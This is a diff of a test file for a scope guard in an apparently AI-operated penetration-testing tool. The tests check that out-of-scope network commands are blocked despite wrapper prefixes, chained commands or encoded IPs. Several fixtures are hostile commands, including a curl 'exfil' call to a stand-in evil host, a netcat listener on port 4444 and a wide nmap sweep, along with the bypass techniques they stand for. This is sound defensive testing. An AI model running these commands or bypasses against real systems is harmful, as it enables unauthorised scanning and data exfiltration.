@@ -1,10 +1,14 @@
 // ============================================================
-// Phase D: target-token argv guard.
+// Scope guard — implicit target extraction.
 //
-// _process-runner already extracts implicit targets when the technique
-// or binary is target-facing. This test pins down the new fail-closed
-// behavior when the caller uses a non-target-facing technique label
-// (e.g. 'note', 'research') but argv embeds a URL/IP/hostname.
+// _process-runner sniffs implicit targets from the FULL command whenever the
+// action is target-facing or invokes a network-capable binary — detected
+// across every shell segment and behind any wrapper prefix, not just from the
+// first command token — and merges them into the per-target scope validation
+// set. This pins the unified behavior and the three bypasses it closes:
+//   H-9  wrapper prefix          (proxychains|sudo|timeout … nmap 10/8)
+//   H-10 compound command        (echo ok; curl https://evil/…)
+//   H-11 one in-scope target     suppressing the check of OTHER embedded hosts
 // ============================================================
 
 import { afterEach, beforeEach, describe, expect, it } from 'vitest';
@@ -13,11 +17,21 @@ import { GraphEngine } from '../services/graph-engine.js';
 import { runInstrumentedProcess } from '../tools/_process-runner.js';
 import type { EngagementConfig } from '../types.js';
 
-const TEST_STATE_FILE = './state-test-target-guard.json';
+// Unique paths per test so the async state persist of one test cannot race the
+// cleanup of the next (the shared-file ENOENT flake under parallel runs).
+let testIdx = 0;
+let TEST_ID = 'test-target-guard-0';
+let TEST_STATE_FILE = './state-test-target-guard-0.json';
+
+function freshPaths(): void {
+  testIdx += 1;
+  TEST_ID = `test-target-guard-${testIdx}`;
+  TEST_STATE_FILE = `./state-test-target-guard-${testIdx}.json`;
+}
 
 function makeConfig(): EngagementConfig {
   return {
-    id: 'test-target-guard',
+    id: TEST_ID,
     name: 'target-guard',
     created_at: new Date().toISOString(),
     scope: { cidrs: ['10.10.10.0/24', '10.10.110.0/24'], domains: ['lab.local'], exclusions: ['10.10.110.2'] },
@@ -28,30 +42,31 @@ function makeConfig(): EngagementConfig {
 
 function cleanup(): void {
   try { if (existsSync(TEST_STATE_FILE)) unlinkSync(TEST_STATE_FILE); } catch {}
-  try { rmSync('./evidence-test-target-guard', { recursive: true, force: true }); } catch {}
+  try { if (existsSync(`${TEST_STATE_FILE}.tmp`)) unlinkSync(`${TEST_STATE_FILE}.tmp`); } catch {}
+  try { rmSync(`./evidence-${TEST_ID}`, { recursive: true, force: true }); } catch {}
 }
 
-describe('Phase D — target-token argv guard', () => {
-  beforeEach(() => { cleanup(); });
+describe('Scope guard — implicit target extraction', () => {
+  beforeEach(() => { freshPaths(); cleanup(); });
   afterEach(() => { cleanup(); });
 
-  it('refuses execution when argv contains a URL but no scope metadata', async () => {
+  it('scope-blocks an out-of-scope URL in argv even under a non-target-facing technique', async () => {
     const engine = new GraphEngine(makeConfig(), TEST_STATE_FILE);
     const res = await runInstrumentedProcess(engine, {
       binary: 'curl',
       args: ['https://target.example.com/admin'],
       command_repr: 'curl https://target.example.com/admin',
-      technique: 'note', // not in TARGET_FACING_TECHNIQUES
+      technique: 'note', // not in TARGET_FACING_TECHNIQUES — curl is network-capable
       invoking_tool: 'run_bash',
     });
     expect(res.isError).toBe(true);
     const payload = JSON.parse(res.content[0].text);
     expect(payload.executed).toBe(false);
-    expect(payload.errors[0]).toMatch(/target_tokens_in_argv_without_scope/);
-    expect(payload.argv_tokens_found).toContain('https://target.example.com/admin');
+    expect((payload.errors || []).join(' ')).toMatch(/out of scope/i);
+    expect((payload.errors || []).join(' ')).toMatch(/target\.example\.com/);
   });
 
-  it('refuses execution when a network-capable binary has an IP in argv but no scope', async () => {
+  it('scope-blocks an out-of-scope IP passed to a network-capable binary', async () => {
     const engine = new GraphEngine(makeConfig(), TEST_STATE_FILE);
     const res = await runInstrumentedProcess(engine, {
       binary: 'nc',
@@ -62,10 +77,11 @@ describe('Phase D — target-token argv guard', () => {
     });
     expect(res.isError).toBe(true);
     const payload = JSON.parse(res.content[0].text);
-    expect(payload.argv_tokens_found).toContain('9.9.9.9');
+    expect((payload.errors || []).join(' ')).toMatch(/9\.9\.9\.9/);
+    expect((payload.errors || []).join(' ')).toMatch(/out of scope/i);
   });
 
-  it('does not fire on shell-only binaries that mention IPs/URLs in argv (echo, cat, etc.)', async () => {
+  it('does not fire on shell-only binaries that mention IPs/URLs in argv (echo, cat, …)', async () => {
     const engine = new GraphEngine(makeConfig(), TEST_STATE_FILE);
     const res = await runInstrumentedProcess(engine, {
       binary: 'echo',
@@ -76,30 +92,24 @@ describe('Phase D — target-token argv guard', () => {
     });
     expect(res.isError).toBeFalsy();
     const payload = JSON.parse(res.content[0].text);
-    expect(payload.argv_tokens_found).toBeUndefined();
     expect(payload.executed).not.toBe(false);
   });
 
-  it('lets target-facing techniques continue through implicit extraction', async () => {
-    // 'recon' IS target-facing, so the existing F3 path runs and the
-    // implicit IP gets re-validated against scope. With 9.9.9.9 out of
-    // scope this still fails, but with the OUT_OF_SCOPE error rather
-    // than the new argv-guard error.
+  it('lets target-facing techniques continue through implicit extraction (out-of-scope IP blocked)', async () => {
     const engine = new GraphEngine(makeConfig(), TEST_STATE_FILE);
     const res = await runInstrumentedProcess(engine, {
       binary: 'echo',
       args: ['9.9.9.9'],
       command_repr: 'echo 9.9.9.9',
-      technique: 'recon',
+      technique: 'recon', // IS target-facing
       invoking_tool: 'run_bash',
     });
     expect(res.isError).toBe(true);
     const payload = JSON.parse(res.content[0].text);
-    expect(payload.errors.join(' ')).toMatch(/out of scope/);
-    expect(payload.errors.join(' ')).not.toMatch(/target_tokens_in_argv_without_scope/);
+    expect((payload.errors || []).join(' ')).toMatch(/out of scope/i);
   });
 
-  it('honors allow_unverified_scope as the explicit operator escape hatch', async () => {
+  it('honors allow_unverified_scope for shell-only commands that reference URLs', async () => {
     const engine = new GraphEngine(makeConfig(), TEST_STATE_FILE);
     const res = await runInstrumentedProcess(engine, {
       binary: 'echo',
@@ -109,10 +119,8 @@ describe('Phase D — target-token argv guard', () => {
       allow_unverified_scope: true,
       invoking_tool: 'run_bash',
     });
-    // echo exits 0 — should succeed, not be blocked by the new guard.
     expect(res.isError).toBeFalsy();
     const payload = JSON.parse(res.content[0].text);
-    expect(payload.argv_tokens_found).toBeUndefined();
     expect(payload.executed).not.toBe(false);
   });
 
@@ -145,5 +153,370 @@ describe('Phase D — target-token argv guard', () => {
     expect(res.isError).toBeFalsy();
     const started = engine.getFullHistory().find(e => e.event_type === 'action_started');
     expect(started?.details).toMatchObject({ operator_infra: true });
+  });
+
+  // ---- H-9: wrapper prefix must not hide the wrapped binary ----
+  it('H-9: blocks an out-of-scope scan hidden behind a wrapper prefix (proxychains)', async () => {
+    const engine = new GraphEngine(makeConfig(), TEST_STATE_FILE);
+    const res = await runInstrumentedProcess(engine, {
+      binary: 'proxychains',
+      args: ['nmap', '10.0.0.0/8'],
+      command_repr: 'proxychains nmap 10.0.0.0/8',
+      technique: 'note', // non-target-facing label — the nmap token must still be classified
+      invoking_tool: 'run_bash',
+    });
+    expect(res.isError).toBe(true);
+    const payload = JSON.parse(res.content[0].text);
+    expect((payload.errors || []).join(' ')).toMatch(/out of scope/i);
+    expect((payload.errors || []).join(' ')).toMatch(/10\.0\.0\.0\/8/);
+  });
+
+  it('H-9: blocks an out-of-scope host behind a timeout wrapper', async () => {
+    const engine = new GraphEngine(makeConfig(), TEST_STATE_FILE);
+    const res = await runInstrumentedProcess(engine, {
+      binary: 'timeout',
+      args: ['30', 'curl', 'https://evil.out-of-scope.com/x'],
+      command_repr: 'timeout 30 curl https://evil.out-of-scope.com/x',
+      technique: 'note',
+      invoking_tool: 'run_bash',
+    });
+    expect(res.isError).toBe(true);
+    expect((JSON.parse(res.content[0].text).errors || []).join(' ')).toMatch(/out of scope/i);
+  });
+
+  // ---- H-10: compound command must not be classified by a benign first token ----
+  it('H-10: blocks an out-of-scope egress in a later compound-command segment', async () => {
+    const engine = new GraphEngine(makeConfig(), TEST_STATE_FILE);
+    const res = await runInstrumentedProcess(engine, {
+      binary: 'bash',
+      args: ['-c', 'echo start; curl https://evil.out-of-scope.com/exfil'],
+      command_repr: 'echo start; curl https://evil.out-of-scope.com/exfil',
+      technique: 'note',
+      invoking_tool: 'run_bash',
+    });
+    expect(res.isError).toBe(true);
+    const payload = JSON.parse(res.content[0].text);
+    expect((payload.errors || []).join(' ')).toMatch(/out of scope/i);
+    expect((payload.errors || []).join(' ')).toMatch(/evil\.out-of-scope\.com/);
+  });
+
+  it('H-10: still runs a benign compound command with no network-capable binary', async () => {
+    const engine = new GraphEngine(makeConfig(), TEST_STATE_FILE);
+    const res = await runInstrumentedProcess(engine, {
+      binary: 'bash',
+      args: ['-c', 'echo one; echo two'],
+      command_repr: 'echo one; echo two',
+      technique: 'note',
+      invoking_tool: 'run_bash',
+    });
+    expect(res.isError).toBeFalsy();
+    expect(JSON.parse(res.content[0].text).executed).not.toBe(false);
+  });
+
+  // ---- H-11: one in-scope target must not suppress checking OTHER embedded hosts ----
+  it('H-11: an explicit in-scope target does not suppress an out-of-scope host in the same command', async () => {
+    const engine = new GraphEngine(makeConfig(), TEST_STATE_FILE);
+    const res = await runInstrumentedProcess(engine, {
+      binary: 'nmap',
+      args: ['10.10.10.5', '9.9.9.9'],
+      command_repr: 'nmap 10.10.10.5 9.9.9.9',
+      technique: 'port_scan',
+      target_ips: ['10.10.10.5'], // one declared, in scope
+      invoking_tool: 'run_tool',
+      timeout_ms: 100,
+    });
+    expect(res.isError).toBe(true);
+    const payload = JSON.parse(res.content[0].text);
+    expect((payload.errors || []).join(' ')).toMatch(/9\.9\.9\.9/);
+    expect((payload.errors || []).join(' ')).toMatch(/out of scope/i);
+  });
+
+  it('H-11: a multi-target command entirely in scope still runs', async () => {
+    const engine = new GraphEngine(makeConfig(), TEST_STATE_FILE);
+    const res = await runInstrumentedProcess(engine, {
+      binary: 'nmap',
+      args: ['10.10.10.5', '10.10.110.9'],
+      command_repr: 'nmap 10.10.10.5 10.10.110.9',
+      technique: 'port_scan',
+      target_ips: ['10.10.10.5'],
+      invoking_tool: 'run_tool',
+      timeout_ms: 100,
+    });
+    const payload = JSON.parse(res.content[0].text);
+    expect((payload.errors || []).join(' ')).not.toMatch(/out of scope/i);
+  });
+
+  // ---- fail closed when a host operand can't be resolved to a scope target ----
+  it('fails closed on a bare single-label host that extraction cannot resolve (ssh dc01)', async () => {
+    const engine = new GraphEngine(makeConfig(), TEST_STATE_FILE);
+    const res = await runInstrumentedProcess(engine, {
+      binary: 'ssh',
+      args: ['dc01'],
+      command_repr: 'ssh dc01',
+      technique: 'note',
+      invoking_tool: 'run_bash',
+    });
+    expect(res.isError).toBe(true);
+    expect(JSON.parse(res.content[0].text).errors.join(' ')).toMatch(/unresolved_target_without_scope/);
+  });
+
+  it('blocks a bare ::-collapsed IPv6 target (nc fe80::1)', async () => {
+    const engine = new GraphEngine(makeConfig(), TEST_STATE_FILE);
+    const res = await runInstrumentedProcess(engine, {
+      binary: 'nc',
+      args: ['fe80::1', '9000'],
+      command_repr: 'nc fe80::1 9000',
+      technique: 'note',
+      invoking_tool: 'run_bash',
+    });
+    expect(res.isError).toBe(true);
+    // Either extracted + scope-checked, or the fail-closed backstop — both block.
+    expect(JSON.parse(res.content[0].text).errors.join(' ')).toMatch(/out of scope|unresolved_target_without_scope/i);
+  });
+
+  it('blocks a numeric-encoded IP target (nc 3232235521 -> 192.168.0.1, out of scope)', async () => {
+    const engine = new GraphEngine(makeConfig(), TEST_STATE_FILE);
+    const res = await runInstrumentedProcess(engine, {
+      binary: 'nc',
+      args: ['3232235521', '80'],
+      command_repr: 'nc 3232235521 80',
+      technique: 'note',
+      invoking_tool: 'run_bash',
+    });
+    expect(res.isError).toBe(true);
+    // Normalized to 192.168.0.1 and scope-checked, or fail-closed — both block.
+    expect(JSON.parse(res.content[0].text).errors.join(' ')).toMatch(/out of scope|unresolved_target_without_scope/i);
+  });
+
+  it('blocks a decimal-encoded IP on a non-host-first binary (curl 3232235521)', async () => {
+    const engine = new GraphEngine(makeConfig(), TEST_STATE_FILE);
+    const res = await runInstrumentedProcess(engine, {
+      binary: 'curl',
+      args: ['3232235521'],
+      command_repr: 'curl 3232235521',
+      technique: 'note',
+      invoking_tool: 'run_bash',
+    });
+    expect(res.isError).toBe(true);
+    expect((JSON.parse(res.content[0].text).errors || []).join(' ')).toMatch(/out of scope/i);
+  });
+
+  it('boolean nc -o does not swallow the following host (nc -o <out-of-scope-ip>)', async () => {
+    const engine = new GraphEngine(makeConfig(), TEST_STATE_FILE);
+    const res = await runInstrumentedProcess(engine, {
+      binary: 'nc',
+      args: ['-o', '9.9.9.9', '4444'],
+      command_repr: 'nc -o 9.9.9.9 4444',
+      technique: 'note',
+      invoking_tool: 'run_bash',
+    });
+    expect(res.isError).toBe(true);
+    expect((JSON.parse(res.content[0].text).errors || []).join(' ')).toMatch(/9\.9\.9\.9|out of scope/i);
+  });
+
+  it('nc -w timeout keeps the following host in scope check (nc -w 3 <out-of-scope-ip>)', async () => {
+    const engine = new GraphEngine(makeConfig(), TEST_STATE_FILE);
+    const res = await runInstrumentedProcess(engine, {
+      binary: 'nc',
+      args: ['-w', '3', '9.9.9.9', '4444'],
+      command_repr: 'nc -w 3 9.9.9.9 4444',
+      technique: 'note',
+      invoking_tool: 'run_bash',
+    });
+    expect(res.isError).toBe(true);
+    expect((JSON.parse(res.content[0].text).errors || []).join(' ')).toMatch(/9\.9\.9\.9|out of scope/i);
+  });
+
+  it('fabricated flag on telnet does not swallow the host (telnet -o <out-of-scope-ip>)', async () => {
+    const engine = new GraphEngine(makeConfig(), TEST_STATE_FILE);
+    const res = await runInstrumentedProcess(engine, {
+      binary: 'telnet',
+      args: ['-o', '9.9.9.9'],
+      command_repr: 'telnet -o 9.9.9.9',
+      technique: 'note',
+      invoking_tool: 'run_bash',
+    });
+    expect(res.isError).toBe(true);
+    expect((JSON.parse(res.content[0].text).errors || []).join(' ')).toMatch(/9\.9\.9\.9|out of scope/i);
+  });
+
+  it('boolean nc -b does not swallow a bare-host operand', async () => {
+    const engine = new GraphEngine(makeConfig(), TEST_STATE_FILE);
+    const res = await runInstrumentedProcess(engine, {
+      binary: 'nc',
+      args: ['-b', 'dc01', '445'],
+      command_repr: 'nc -b dc01 445',
+      technique: 'note',
+      invoking_tool: 'run_bash',
+    });
+    expect(res.isError).toBe(true);
+    expect((JSON.parse(res.content[0].text).errors || []).join(' ')).toMatch(/unresolved_target_without_scope|out of scope/i);
+  });
+
+  it('does not over-extract a `::` substring inside a URL path as a spurious IPv6 target', async () => {
+    const engine = new GraphEngine(makeConfig(), TEST_STATE_FILE);
+    // host lab.local is in scope (domains: ['lab.local']); the a::b path fragment
+    // must not be extracted as an out-of-scope IPv6 and block the request.
+    const res = await runInstrumentedProcess(engine, {
+      binary: 'curl',
+      args: ['http://api.lab.local/a::b'],
+      command_repr: 'curl http://api.lab.local/a::b',
+      technique: 'note',
+      invoking_tool: 'run_bash',
+      timeout_ms: 100,
+    });
+    expect((JSON.parse(res.content[0].text).errors || []).join(' ')).not.toMatch(/out of scope/i);
+  });
+
+  it('honors allow_unverified_scope for a bare-host network command', async () => {
+    const engine = new GraphEngine(makeConfig(), TEST_STATE_FILE);
+    const res = await runInstrumentedProcess(engine, {
+      binary: 'ssh',
+      args: ['dc01'],
+      command_repr: 'ssh dc01',
+      technique: 'note',
+      allow_unverified_scope: true,
+      invoking_tool: 'run_bash',
+      timeout_ms: 100,
+    });
+    // Not blocked by the scope guard (may still fail to connect — that's fine).
+    expect((JSON.parse(res.content[0].text).errors || []).join(' ')).not.toMatch(/unresolved_target_without_scope/);
+  });
+
+  it('does not fail closed on a flags-only network command (no host operand)', async () => {
+    const engine = new GraphEngine(makeConfig(), TEST_STATE_FILE);
+    const res = await runInstrumentedProcess(engine, {
+      binary: 'curl',
+      args: ['--version'],
+      command_repr: 'curl --version',
+      technique: 'note',
+      invoking_tool: 'run_bash',
+      timeout_ms: 2000,
+    });
+    expect(JSON.parse(res.content[0].text).errors?.join(' ') || '').not.toMatch(/unresolved_target_without_scope/);
+  });
+
+  // ---- no over-blocking of incidental host-like tokens when a target is declared ----
+  it('does not scope-block an incidental script-filename token when an in-scope target is declared', async () => {
+    const engine = new GraphEngine(makeConfig(), TEST_STATE_FILE);
+    const res = await runInstrumentedProcess(engine, {
+      binary: 'nmap',
+      args: ['--script', 'http-enum.nse', '10.10.10.5'],
+      command_repr: 'nmap --script http-enum.nse 10.10.10.5',
+      technique: 'service_scan',
+      target_ips: ['10.10.10.5'],
+      invoking_tool: 'run_tool',
+      timeout_ms: 100,
+    });
+    expect((JSON.parse(res.content[0].text).errors || []).join(' ')).not.toMatch(/out of scope/i);
+  });
+
+  it('does not scope-block an out-of-scope referer URL in an option value when the target is in scope', async () => {
+    const engine = new GraphEngine(makeConfig(), TEST_STATE_FILE);
+    const res = await runInstrumentedProcess(engine, {
+      binary: 'curl',
+      args: ['-e', 'https://www.google.com/', 'http://10.10.10.5/'],
+      command_repr: 'curl -e https://www.google.com/ http://10.10.10.5/',
+      technique: 'note',
+      target_ip: '10.10.10.5',
+      invoking_tool: 'run_bash',
+      timeout_ms: 100,
+    });
+    expect((JSON.parse(res.content[0].text).errors || []).join(' ')).not.toMatch(/google\.com|out of scope/i);
+  });
+
+  // ---- boolean-flag must NOT swallow the following target (fail-open guard) ----
+  it('scope-blocks curl -s <out-of-scope-url> (boolean flag does not swallow the target)', async () => {
+    const engine = new GraphEngine(makeConfig(), TEST_STATE_FILE);
+    const res = await runInstrumentedProcess(engine, {
+      binary: 'curl',
+      args: ['-s', 'https://evil.out-of-scope.com/exfil'],
+      command_repr: 'curl -s https://evil.out-of-scope.com/exfil',
+      technique: 'note',
+      invoking_tool: 'run_bash',
+    });
+    expect(res.isError).toBe(true);
+    expect((JSON.parse(res.content[0].text).errors || []).join(' ')).toMatch(/out of scope/i);
+  });
+
+  it('scope-blocks wget -c <out-of-scope-url>', async () => {
+    const engine = new GraphEngine(makeConfig(), TEST_STATE_FILE);
+    const res = await runInstrumentedProcess(engine, {
+      binary: 'wget',
+      args: ['-c', 'https://evil.out-of-scope.com/x'],
+      command_repr: 'wget -c https://evil.out-of-scope.com/x',
+      technique: 'note',
+      invoking_tool: 'run_bash',
+    });
+    expect(res.isError).toBe(true);
+    expect((JSON.parse(res.content[0].text).errors || []).join(' ')).toMatch(/out of scope/i);
+  });
+
+  it('scope-blocks an out-of-scope target carried by ldapsearch -H (binary-specific value flag)', async () => {
+    const engine = new GraphEngine(makeConfig(), TEST_STATE_FILE);
+    const res = await runInstrumentedProcess(engine, {
+      binary: 'ldapsearch',
+      args: ['-H', 'ldap://evil-dc.out-of-scope.com', '-b', 'dc=x'],
+      command_repr: 'ldapsearch -H ldap://evil-dc.out-of-scope.com -b dc=x',
+      technique: 'enum_ldap',
+      invoking_tool: 'run_bash',
+    });
+    expect(res.isError).toBe(true);
+    expect((JSON.parse(res.content[0].text).errors || []).join(' ')).toMatch(/out of scope/i);
+  });
+
+  // ---- ssh identity/config value flags must not become the host ----
+  it('does not fail closed on ssh -i keyfile when the host is in scope', async () => {
+    const engine = new GraphEngine(makeConfig(), TEST_STATE_FILE);
+    const res = await runInstrumentedProcess(engine, {
+      binary: 'ssh',
+      args: ['-i', 'id_rsa', '10.10.10.5'],
+      command_repr: 'ssh -i id_rsa 10.10.10.5',
+      technique: 'note',
+      invoking_tool: 'run_bash',
+      timeout_ms: 100,
+    });
+    expect((JSON.parse(res.content[0].text).errors || []).join(' ')).not.toMatch(/unresolved_target_without_scope|out of scope/i);
+  });
+
+  // ---- host-first: only the first positional is the host (remote command allowed) ----
+  it('does not fail closed on a remote command after an in-scope ssh host', async () => {
+    const engine = new GraphEngine(makeConfig(), TEST_STATE_FILE);
+    const res = await runInstrumentedProcess(engine, {
+      binary: 'ssh',
+      args: ['10.10.10.5', 'whoami'],
+      command_repr: 'ssh 10.10.10.5 whoami',
+      technique: 'note',
+      invoking_tool: 'run_bash',
+      timeout_ms: 100,
+    });
+    expect((JSON.parse(res.content[0].text).errors || []).join(' ')).not.toMatch(/unresolved_target_without_scope/);
+  });
+
+  it('does not fail closed on a bare listener with no host operand (nc -lvnp 4444)', async () => {
+    const engine = new GraphEngine(makeConfig(), TEST_STATE_FILE);
+    const res = await runInstrumentedProcess(engine, {
+      binary: 'nc',
+      args: ['-lvnp', '4444'],
+      command_repr: 'nc -lvnp 4444',
+      technique: 'note',
+      invoking_tool: 'run_bash',
+      timeout_ms: 100,
+    });
+    expect((JSON.parse(res.content[0].text).errors || []).join(' ')).not.toMatch(/unresolved_target_without_scope/);
+  });
+
+  // ---- quote-aware segment split: a separator inside a quote is not a segment ----
+  it('does not misclassify a benign echo whose quoted text contains "; ssh host"', async () => {
+    const engine = new GraphEngine(makeConfig(), TEST_STATE_FILE);
+    const res = await runInstrumentedProcess(engine, {
+      binary: 'bash',
+      args: ['-c', 'echo "reminder; ssh into jumpbox.corp.example.com later"'],
+      command_repr: 'echo "reminder; ssh into jumpbox.corp.example.com later"',
+      technique: 'note',
+      invoking_tool: 'run_bash',
+    });
+    expect(res.isError).toBeFalsy();
+    expect(JSON.parse(res.content[0].text).executed).not.toBe(false);
   });
 });
